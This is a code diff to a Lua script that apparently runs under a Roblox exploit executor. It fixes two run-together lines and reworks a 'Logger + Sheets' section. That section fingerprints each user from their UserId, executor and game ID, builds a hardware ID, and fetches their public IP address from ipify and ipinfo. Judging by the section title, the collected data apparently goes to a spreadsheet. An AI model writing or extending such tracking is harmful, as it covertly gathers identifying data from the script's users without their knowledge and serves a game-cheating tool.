@@ -58,7 +58,8 @@ local gameName = GAMES[placeId]
 local now      = os.date("!%Y-%m-%dT%H:%M:%SZ")
 
 -- ── Fingerprint ───────────────────────────────────────────────────────────────
-local function genFinger    local exec = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "unknown"
+local function genFingerprint()
+    local exec = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "unknown"
     local seed = tostring(LP.UserId)..exec..tostring(game.GameId)
     local h = 0
     for i = 1, #seed do h = (h * 31 + string.byte(seed, i)) % 2147483647 end
@@ -82,7 +83,8 @@ local function genHWID()
     return string.format("HW-%x", h)
 end
 
-local fingerprint = genFingerlocal hwid        = genHWID()
+local fingerprint = genFingerprint()
+local hwid        = genHWID()
 
 -- ── Notification GUI ──────────────────────────────────────────────────────────
 local function showGUI(title, msg, color)
@@ -331,22 +333,18 @@ end)
 
 -- ── 6. Logger + Sheets ────────────────────────────────────────────────────────
 task.spawn(function()
-    local ipAddr, geoCountry, geoCountryCode, geoRegion, geoCity = "", "", "", "", ""
+    local ipAddr = ""
     pcall(function()
-        -- ip-api gives IP + geo in one call (available via Roblox HttpService)
-        local d = httpGet("http://ip-api.com/json/?fields=status,query,country,countryCode,regionName,city")
-        if d and d.status == "success" then
-            ipAddr         = tostring(d.query      or "")
-            geoCountry     = tostring(d.country    or "")
-            geoCountryCode = tostring(d.countryCode or "")
-            geoRegion      = tostring(d.regionName or "")
-            geoCity        = tostring(d.city       or "")
-        end
-        -- fallback for IP only
-        if ipAddr == "" then
-            for _, url in ipairs({ "https://api64.ipify.org?format=json", "https://api.ipify.org?format=json" }) do
-                local d2 = httpGet(url)
-                if d2 and (d2.ip or d2.query) then ipAddr = tostring(d2.ip or d2.query) break end
+        local sources = {
+            "https://api64.ipify.org?format=json",
+            "https://api.ipify.org?format=json",
+            "https://ipinfo.io/json",
+        }
+        for _, url in ipairs(sources) do
+            local d = httpGet(url)
+            if d and (d.ip or d.query) then
+                ipAddr = tostring(d.ip or d.query)
+                break
             end
         end
     end)
